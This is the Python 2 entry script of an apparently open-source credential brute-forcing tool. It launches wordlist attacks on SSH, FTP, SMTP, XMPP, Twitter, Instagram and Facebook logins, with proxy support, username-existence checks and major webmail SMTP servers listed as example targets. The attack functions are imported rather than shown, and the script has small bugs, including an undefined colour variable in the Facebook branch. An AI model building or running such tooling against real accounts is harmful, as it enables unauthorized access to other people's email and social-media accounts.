#!/usr/bin/python
from src.mainLib import *
from src.header import *
from core.protocols import *
from core.web import *

####################
# Main function. Append user args for visually appealing output
####################

def main():

    service, username, wordlist, address, port, delay, proxy = get_args()

    print choice(headers)

    print (G + "[*] Username: %s " % username) + W
    sleep(0.5)
    print (G + "[*] Wordlist: %s " % wordlist) + W
    sleep(0.5)
    if os.path.exists(wordlist) == False:
        print R + "[!] Wordlist not found! [!]" + W
        exit()
    print (C + "[*] Service: %s "  % service)
    if proxy is not None:
        print (C + "[*] Proxy file: %s " % proxy) + W
        print O + "Checking if proxies are active..." + W
        print ""
        proxyServer(proxy)
        print ""
    sleep(0.5)

    # SSH bruteforce
    if service == 'ssh':
        if address is None:
            print R + "[!] You need to provide a SSH address for cracking! [!]" + W
            exit()
        print C + "[*] Address: %s" % address + W
        sleep(0.5)
        # If a port is not provided, set it to default 22
        if port is None:
            print O + "[?] Port not set. Automatically set to 22 for you [?]" + W
            port = 22

        print C + "[*] Port: %s "  % port + W
        sleep(1)
        print P + "[*] Starting dictionary attack! [*]" + W
        print "Using %s seconds of delay. Default is 1 second" % delay
        # Call the sshBruteforce() method
        sshBruteforce(address, username, wordlist, port, delay)
        call(["rm", "filename.log"])

    # FTP bruteforce
    elif service == 'ftp':
        if address is None:
            print R + "[!] You need to provide a FTP address for cracking! [!]" + W
        print C + "[*] Address: %s" % address + W
        sleep(0.5)
        if port is None:
            print O + "[?] Port not set. Automatically set to 21 for you [?]" + W
            port = 21
        print C + "[*] Port: %s "  % port + W
        sleep(1)
        print P + "[*] Starting dictionary attack! [*]" + W
        print "Using %s seconds of delay. Default is 1 second" % delay
        ftpBruteforce(address, username, wordlist, delay, port)

    # SMTP bruteforce
    elif service == 'smtp':
        if address is None:
            print R + "[!] You need to provide an SMTP server address for cracking! [!]" + W
            print O + "| Gmail: smtp.gmail.com |\n| Outlook: smtp.live.com |\n| Yahoo Mail: smtp.mail.yahoo.com |\n| AOL: smtp.aol.com | " + W
        print C + "[*] SMTP server: %s" % address + W
        sleep(0.5)
        if port is None:
            print O + "[?] Port not set. Automatically set to 587 for you [?]"
            print O + "[?] NOTE: SMTP has several ports for usage, including 25, 465, 587" + W
            port = 587
        print C + "[*] Port: %s "  % port + W
        sleep(1)
        print P + "[*] Starting dictionary attack! [*]" + W
        print "Using %s seconds of delay. Default is 1 second" % delay
        smtpBruteforce(address, username, wordlist, delay, port)

    # XMPP bruteforce
    elif service == 'xmpp':
        if address is None:
            print R + "[!] NOTE: You need to include a server address for cracking XMPP [!]" + W
            print O + "| For example: cypherpunks.it | inbox.im | creep.im |" + W
        print C + "[*] XMPP server: %s" % address + W
        sleep(0.5)
        if port is None:
            print O + "[?] Port not set. Automatically set to 5222 for you [?]"
            port = 5222
        print C + "[*] Port: %s "  % port + W
        sleep(1)
        print P + "[*] Starting dictionary attack! [*]" + W
        print "Using %s seconds of delay. Default is 1 second" % delay
        xmppBruteforce(address, port, username, wordlist, delay)

    # Twitter Bruteforce
    elif service == 'twitter':
        if address or port:
            print R + "[!] NOTE: You don't need to provide an address OR port for Twitter (LOL) [!]" + W
            exit()
        print P + "[*] Checking if username exists..." + W
        if usercheck(username, service) == 1:
            print R + "[!] The username was not found! Exiting..." + W
            exit()
        print G + "[*] Username found! Continuing..." + W
        sleep(1)
        webBruteforce(username, wordlist, service, delay)

    # Instagram Bruteforce
    elif service == 'instagram':
        if address or port:
            print R + "[!] NOTE: You don't need to provide an address OR port for Instagram (LOL) [!]" + W
            exit()
        print P + "[*] Checking if username exists..." + W
        if usercheck(username, service) == 1:
            print R + "[!] The username was not found! Exiting..." + W
            exit()
        print G + "[*] Username found! Continuing..." + W
        sleep(1)
        print P + "[*] Starting dictionary attack! [*]" + W
        print "Using %s seconds of delay. Default is 1 second" % delay
        webBruteforce(username, wordlist, service, delay)

    # Facebook Bruteforce
    elif service == 'facebook':
        if address or port:
            print R + "[!] NOTE: You don't need to provide an address OR port for Facebook (LOL) [!]" + w
            exit()
        print P + "[*] Checking if username exists..." + W
        if usercheck(username, service) == 1:
            print R + "[!] The username was not found! Exiting..." + W
            exit()
        print G + "[*] Username found! Continuing..." + W
        sleep(1)
        print P + "[*] Starting dictionary attack! [*]" + W
        print "Using %s seconds of delay. Default is 1 second" % delay
        webBruteforce(username, wordlist, service, delay)


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print R + "\n[!] Keyboard Interrupt detected! Killing program... [!]" + W
        sys.exit(1)
